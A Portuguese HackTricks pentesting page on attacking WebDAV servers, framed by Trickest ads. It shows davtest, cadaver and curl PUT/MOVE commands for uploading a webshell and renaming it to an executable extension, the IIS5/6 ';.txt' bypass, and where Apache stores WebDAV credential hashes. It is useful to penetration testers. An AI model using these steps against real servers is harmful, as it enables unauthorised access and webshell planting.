# WebDav

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=put-method-webdav) para construir e **automatizar fluxos de trabalho** facilmente com as **ferramentas** da comunidade **mais avan√ßadas** do mundo.\
Acesse hoje:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=put-method-webdav" %}

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>
{% endhint %}
{% endhint %}

Ao lidar com um **Servidor HTTP com WebDav** habilitado, √© poss√≠vel **manipular arquivos** se voc√™ tiver as **credenciais** corretas, geralmente verificadas atrav√©s da **Autentica√ß√£o B√°sica HTTP**. Ganhar controle sobre tal servidor muitas vezes envolve o **upload e execu√ß√£o de um webshell**.

O acesso ao servidor WebDav normalmente requer **credenciais v√°lidas**, sendo o [**bruteforce WebDav**](../../generic-methodologies-and-resources/brute-force.md#http-basic-auth) um m√©todo comum para adquiri-las.

Para superar restri√ß√µes em uploads de arquivos, especialmente aquelas que impedem a execu√ß√£o de scripts do lado do servidor, voc√™ pode:

* **Fazer upload** de arquivos com **extens√µes execut√°veis** diretamente se n√£o houver restri√ß√µes.
* **Renomear** arquivos n√£o execut√°veis enviados (como .txt) para uma extens√£o execut√°vel.
* **Copiar** arquivos n√£o execut√°veis enviados, mudando sua extens√£o para uma que seja execut√°vel.

## DavTest

**Davtest** tenta **fazer upload de v√°rios arquivos com diferentes extens√µes** e **verifica** se a extens√£o √© **executada**:
```bash
davtest [-auth user:password] -move -sendbd auto -url http://<IP> #Uplaod .txt files and try to move it to other extensions
davtest [-auth user:password] -sendbd auto -url http://<IP> #Try to upload every extension
```
![](<../../.gitbook/assets/image (851).png>)

Isso n√£o significa que **.txt** e **.html extensions est√£o sendo executadas**. Isso significa que voc√™ pode **acessar esses arquivos** atrav√©s da web.

## Cadaver

Voc√™ pode usar essa ferramenta para **conectar ao servidor WebDav** e realizar a√ß√µes (como **upload**, **mover** ou **deletar**) **manualmente**.
```
cadaver <IP>
```
## Requisi√ß√£o PUT
```
curl -T 'shell.txt' 'http://$ip'
```
## Solicita√ß√£o MOVE
```
curl -X MOVE --header 'Destination:http://$ip/shell.php' 'http://$ip/shell.txt'
```
<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=put-method-webdav) para construir e **automatizar fluxos de trabalho** facilmente com as **ferramentas** da comunidade **mais avan√ßadas** do mundo.\
Acesse hoje:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=put-method-webdav" %}

## Vulnerabilidade do IIS5/6 WebDav

Essa vulnerabilidade √© muito interessante. O **WebDav** **n√£o permite** **carregar** ou **renomear** arquivos com a extens√£o **.asp**. Mas voc√™ pode **contornar** isso **adicionando** no final do nome **";.txt"** e o arquivo ser√° **executado** como se fosse um arquivo .asp (voc√™ tamb√©m poderia **usar ".html" em vez de ".txt"** mas **N√ÉO esque√ßa o ";"**).

Ent√£o voc√™ pode **carregar** seu shell como um arquivo ".**txt"** e **copi√°-lo/mov√™-lo para um arquivo ".asp;.txt"**. Ao acessar esse arquivo atrav√©s do servidor web, ele ser√° **executado** (o cadaver dir√° que a a√ß√£o de mover n√£o funcionou, mas funcionou).

![](<../../.gitbook/assets/image (1092).png>)

## Credenciais p√≥s

Se o Webdav estiver usando um servidor Apache, voc√™ deve verificar os sites configurados no Apache. Comumente:\
_**/etc/apache2/sites-enabled/000-default**_

Dentro dele voc√™ pode encontrar algo como:
```
ServerAdmin webmaster@localhost
Alias /webdav /var/www/webdav
<Directory /var/www/webdav>
DAV On
AuthType Digest
AuthName "webdav"
AuthUserFile /etc/apache2/users.password
Require valid-user
```
Como voc√™ pode ver, h√° os arquivos com as **credenciais** v√°lidas para o servidor **webdav**:
```
/etc/apache2/users.password
```
Dentro deste tipo de arquivos, voc√™ encontrar√° o **username** e um **hash** da senha. Essas s√£o as credenciais que o servidor webdav est√° usando para autenticar usu√°rios.

Voc√™ pode tentar **crack**-√°-los, ou **adicionar mais** se por algum motivo voc√™ quiser **acessar** o servidor **webdav**:
```bash
htpasswd /etc/apache2/users.password <USERNAME> #You will be prompted for the password
```
Para verificar se as novas credenciais est√£o funcionando, voc√™ pode fazer:
```bash
wget --user <USERNAME> --ask-password http://domain/path/to/webdav/ -O - -q
```
## Refer√™ncias

* [https://vk9-sec.com/exploiting-webdav/](https://vk9-sec.com/exploiting-webdav/)
{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Suporte ao HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>
{% endhint %}
</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=put-method-webdav) para construir e **automatizar fluxos de trabalho** facilmente, impulsionados pelas **ferramentas** comunit√°rias **mais avan√ßadas** do mundo.\
Obtenha Acesso Hoje:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=put-method-webdav" %}
